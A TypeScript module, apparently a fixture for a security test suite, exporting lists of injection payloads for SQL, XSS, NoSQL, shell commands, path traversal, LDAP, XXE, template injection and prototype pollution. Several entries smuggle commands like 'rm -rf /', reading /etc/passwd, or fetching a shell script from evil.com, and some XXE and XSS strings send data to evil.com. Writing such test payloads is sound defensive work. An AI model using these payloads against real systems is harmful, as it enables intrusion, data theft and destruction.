/**
 * Collection of attack payloads for security testing
 */

// SQL Injection payloads
export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin'--",
  "admin'/*",
  "' UNION SELECT NULL--",
  "' UNION SELECT * FROM users--",
  "1' OR '1'='1",
  "1' AND '1'='1",
  "'; DROP TABLE users--",
  "' OR 1=1--",
  "' OR 'a'='a",
  "') OR ('1'='1",
  "1' OR '1'='1",
  "admin' OR '1'='1",
  "' OR 1=1#",
  "' OR 1=1/*",
  "') OR ('1'='1--",
  "1' OR '1'='1'--",
  "1' OR '1'='1'/*",
  "1' OR '1'='1'#",
  "' OR 'x'='x",
  "') OR ('x'='x",
  "' OR 1=1 LIMIT 1--",
  "' OR 1=1 LIMIT 1#",
  "' OR 1=1 LIMIT 1/*",
  "1' OR '1'='1' LIMIT 1--",
  "1' OR '1'='1' LIMIT 1#",
  "1' OR '1'='1' LIMIT 1/*",
];

// XSS payloads
export const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",
  "<textarea onfocus=alert('XSS') autofocus>",
  "<keygen onfocus=alert('XSS') autofocus>",
  "<video><source onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",
  "<details open ontoggle=alert('XSS')>",
  "<marquee onstart=alert('XSS')>",
  "<div onmouseover=alert('XSS')>",
  "<style onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "vbscript:alert('XSS')",
  "data:text/html,<script>alert('XSS')</script>",
  "<script>document.cookie</script>",
  "<script>document.location='http://evil.com'</script>",
];

// NoSQL Injection payloads
export const NOSQL_INJECTION_PAYLOADS = [
  { $ne: null },
  { $ne: '' },
  { $gt: '' },
  { $lt: '' },
  { $regex: '.*' },
  { $exists: true },
  { $in: [] },
  { $nin: [] },
  { $where: '1==1' },
  { $or: [{ username: 'admin' }, { password: 'admin' }] },
  { $and: [{ username: 'admin' }, { password: 'admin' }] },
  { $nor: [{ username: 'admin' }] },
  { $not: { username: 'admin' } },
  { $elemMatch: { username: 'admin' } },
  { $size: 0 },
  { $type: 'string' },
  { $mod: [1, 0] },
  { $text: { $search: 'admin' } },
  { $geoWithin: { $center: [[0, 0], 0] } },
];

// Command Injection payloads
export const COMMAND_INJECTION_PAYLOADS = [
  "; ls",
  "| ls",
  "& ls",
  "&& ls",
  "|| ls",
  "`ls`",
  "$(ls)",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "& cat /etc/passwd",
  "&& cat /etc/passwd",
  "|| cat /etc/passwd",
  "`cat /etc/passwd`",
  "$(cat /etc/passwd)",
  "; rm -rf /",
  "| rm -rf /",
  "& rm -rf /",
  "&& rm -rf /",
  "|| rm -rf /",
  "`rm -rf /`",
  "$(rm -rf /)",
  "; wget http://evil.com/shell.sh",
  "| wget http://evil.com/shell.sh",
  "& wget http://evil.com/shell.sh",
  "&& wget http://evil.com/shell.sh",
  "|| wget http://evil.com/shell.sh",
  "`wget http://evil.com/shell.sh`",
  "$(wget http://evil.com/shell.sh)",
];

// Path Traversal payloads
export const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\etc\\passwd",
  "....//....//....//etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "..%5C..%5C..%5Cetc%5Cpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
  "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
  "/etc/passwd",
  "\\etc\\passwd",
  "C:\\Windows\\System32\\config\\sam",
  "/etc/shadow",
  "\\etc\\shadow",
  "/proc/self/environ",
  "\\proc\\self\\environ",
  "/var/log/auth.log",
  "\\var\\log\\auth.log",
];

// LDAP Injection payloads
export const LDAP_INJECTION_PAYLOADS = [
  "*",
  "*)(&",
  "*))%00",
  "*()|&",
  "admin)(&(password=*",
  "admin)(|(password=*",
  "admin)(!(password=*",
  "admin)(&(password=admin",
  "admin)(|(password=admin",
  "admin)(!(password=admin",
  "(&(cn=admin)(password=*))",
  "(|(cn=admin)(password=*))",
  "(!(cn=admin)(password=*))",
  "(&(cn=*)(password=*))",
  "(|(cn=*)(password=*))",
  "(!(cn=*)(password=*))",
];

// XML/XXE payloads
export const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/steal">]><root>&test;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&test;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
];

// Template Injection payloads
export const TEMPLATE_INJECTION_PAYLOADS = [
  "${7*7}",
  "${7*7}",
  "#{7*7}",
  "${self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
  "${T(java.lang.Runtime).getRuntime().exec('calc')}",
  "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
  "#{7*7}",
  "#{self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
  "#{T(java.lang.Runtime).getRuntime().exec('calc')}",
  "#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
];

// Prototype Pollution payloads
// Using 'any' type to allow prototype pollution test payloads
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const PROTOTYPE_POLLUTION_PAYLOADS: any[] = [
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { __proto__: { isAdmin: true } } as any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { constructor: { prototype: { isAdmin: true } } } as any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { __proto__: { toString: 'evil' } } as any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { constructor: { prototype: { toString: 'evil' } } } as any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { __proto__: { valueOf: 'evil' } } as any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  { constructor: { prototype: { valueOf: 'evil' } } } as any,
];

// All payloads combined
export const ALL_ATTACK_PAYLOADS = {
  sql: SQL_INJECTION_PAYLOADS,
  xss: XSS_PAYLOADS,
  nosql: NOSQL_INJECTION_PAYLOADS,
  command: COMMAND_INJECTION_PAYLOADS,
  pathTraversal: PATH_TRAVERSAL_PAYLOADS,
  ldap: LDAP_INJECTION_PAYLOADS,
  xxe: XXE_PAYLOADS,
  template: TEMPLATE_INJECTION_PAYLOADS,
  prototypePollution: PROTOTYPE_POLLUTION_PAYLOADS,
};
